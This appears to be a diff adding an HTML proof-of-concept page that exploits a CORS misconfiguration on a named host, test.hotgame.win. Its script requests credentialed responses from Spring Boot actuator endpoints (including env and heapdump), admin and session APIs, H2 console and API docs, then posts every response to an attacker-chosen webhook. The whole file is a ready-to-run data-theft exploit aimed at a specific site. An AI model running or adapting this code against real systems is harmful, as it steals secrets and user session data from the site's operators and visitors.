@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>CORS Exploit PoC - test.hotgame.win</title>
+    <style>
+        body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
+        .log { margin: 10px 0; padding: 10px; background: #0a0a0a; border-left: 3px solid #0f0; }
+        .success { border-color: #0f0; }
+        .error { border-color: #f00; }
+        .info { border-color: #0ff; }
+        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #0c0; }
+        input { background: #0a0a0a; color: #0f0; border: 1px solid #0f0; padding: 5px; width: 400px; }
+    </style>
+</head>
+<body>
+    <h1>CORS Misconfiguration Exploit - test.hotgame.win</h1>
+    <p>Target: <code>https://test.hotgame.win</code> | Vulnerability: <code>Access-Control-Allow-Origin: *</code> on all responses</p>
+    
+    <div>
+        <label>Webhook URL (to exfiltrate data): </label>
+        <input type="text" id="webhook" placeholder="https://webhook.site/xxxxxx or your Burp Collaborator" value="">
+        <br><br>
+        <button onclick="runExploit()">Execute CORS Exploit</button>
+        <button onclick="clearLogs()" style="background: #666; margin-left: 10px;">Clear Logs</button>
+    </div>
+    
+    <div id="logs"></div>
+
+    <script>
+        const logs = document.getElementById('logs');
+        const webhookInput = document.getElementById('webhook');
+        
+        function log(msg, type = 'info') {
+            const div = document.createElement('div');
+            div.className = `log ${type}`;
+            div.textContent = `[${new Date().toISOString()}] ${msg}`;
+            logs.appendChild(div);
+            logs.scrollTop = logs.scrollHeight;
+        }
+        
+        function clearLogs() {
+            logs.innerHTML = '';
+        }
+        
+        async function exfiltrate(data, endpoint) {
+            const webhook = webhookInput.value.trim();
+            if (!webhook) {
+                log('No webhook configured - logging locally only', 'error');
+                return;
+            }
+            try {
+                await fetch(webhook, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ endpoint, data, timestamp: Date.now() })
+                });
+                log(`Exfiltrated ${endpoint} response to webhook`, 'success');
+            } catch (e) {
+                log(`Exfiltration failed: ${e.message}`, 'error');
+            }
+        }
+        
+        async function testEndpoint(path, label) {
+            const url = `https://test.hotgame.win${path}`;
+            log(`Testing ${label}: ${url}`, 'info');
+            try {
+                const res = await fetch(url, {
+                    method: 'GET',
+                    credentials: 'include',
+                    headers: { 'Accept': 'application/json' }
+                });
+                const text = await res.text();
+                log(`${label} [${res.status}]: ${text.substring(0, 200)}`, res.ok ? 'success' : 'error');
+                await exfiltrate({ status: res.status, body: text, url }, label);
+                return { status: res.status, body: text };
+            } catch (e) {
+                log(`${label} ERROR: ${e.message}`, 'error');
+                await exfiltrate({ error: e.message, url }, label);
+                return null;
+            }
+        }
+        
+        async function runExploit() {
+            log('=== Starting CORS Exploit Chain ===', 'info');
+            
+            // Test 1: Root endpoint (known to work)
+            await testEndpoint('/', 'Root Page');
+            
+            // Test 2: Common Spring Boot Actuator endpoints
+            const actuatorEndpoints = [
+                ['/actuator', 'Actuator Index'],
+                ['/actuator/health', 'Health'],
+                ['/actuator/env', 'Environment (SECRETS!)'],
+                ['/actuator/configprops', 'Config Properties'],
+                ['/actuator/beans', 'Spring Beans'],
+                ['/actuator/mappings', 'URL Mappings'],
+                ['/actuator/heapdump', 'Heap Dump'],
+                ['/actuator/logfile', 'Log File'],
+                ['/actuator/httptrace', 'HTTP Trace'],
+                ['/actuator/metrics', 'Metrics'],
+                ['/actuator/threaddump', 'Thread Dump'],
+            ];
+            
+            for (const [path, label] of actuatorEndpoints) {
+                await testEndpoint(path, label);
+            }
+            
+            // Test 3: Common API patterns
+            const apiEndpoints = [
+                ['/api/user', 'User Info'],
+                ['/api/admin', 'Admin Panel'],
+                ['/api/v1/user', 'User v1'],
+                ['/api/v1/admin', 'Admin v1'],
+                ['/api/profile', 'Profile'],
+                ['/api/config', 'Config'],
+                ['/api/session', 'Session'],
+                ['/api/auth/me', 'Auth Me'],
+            ];
+            
+            for (const [path, label] of apiEndpoints) {
+                await testEndpoint(path, label);
+            }
+            
+            // Test 4: H2 Console (common in Spring Boot dev)
+            await testEndpoint('/h2-console', 'H2 Console');
+            await testEndpoint('/console', 'Generic Console');
+            
+            // Test 5: Swagger/OpenAPI
+            await testEndpoint('/swagger-ui.html', 'Swagger UI');
+            await testEndpoint('/v3/api-docs', 'OpenAPI Docs');
+            await testEndpoint('/api-docs', 'API Docs');
+            
+            log('=== Exploit Chain Complete ===', 'success');
+        }
+    </script>
+</body>
+</html>
